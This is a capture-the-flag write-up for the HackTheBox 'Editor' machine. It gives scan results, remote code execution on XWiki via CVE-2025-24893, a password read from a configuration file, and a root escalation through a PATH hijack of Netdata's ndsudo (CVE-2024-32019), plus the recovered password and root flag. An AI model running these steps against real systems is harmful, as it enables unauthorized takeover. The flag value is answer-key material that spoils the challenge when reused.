# [Challenge](https://app.hackthebox.com/machines/Editor)

# ENUM
## nmap (`nmap -A -p- -T4 --min-rate 5000 editor.htb`)
```nmap
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# EXPLOITATION
Let's see if there's an exploit for XWiki 15.10.8: let's try `CVE-2025-24893: Remote Code Execution`
[It worked](https://github.com/gunzf0x/CVE-2025-24893)! Now we have a shell as `xwiki`.
`python3 -c "import pty;pty.spawn('/bin/bash')"`
# PRIVILEGE ESCALATION	
We need to find oliver's credentials, let's check `hibernate.cfg.xml`: `cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep password` -> `theEd1t0rTeam99`
Now let's log into SSH as oliver and let's check `user.txt`: ``

```bash
$ find / -perm -4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```
I searched for all of them, and `ndsudo` is vulnerable to `CVE-2024-32019`: 
> This POC is used to exploit a vulnerable `ndsudo` utility bundled with Netdata to escalate local privileges to root. The exploit works by injecting a malicious binary into the user’s `PATH` that impersonates a trusted command (`nvme`) and is executed with root privileges by `ndsudo`. [GitHub](https://github.com/AzureADTrent/CVE-2024-32019-POC)

Let's load the script, compile and run it: `gcc poc.c -o nvme` -> upload `nvme` to `editor` -> `chmod +x nvme` -> `export PATH=/tmp:$PATH` -> `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`
We're ROOT!
`root.txt`: `ca9c79fd519cadc952b50295f789cef2`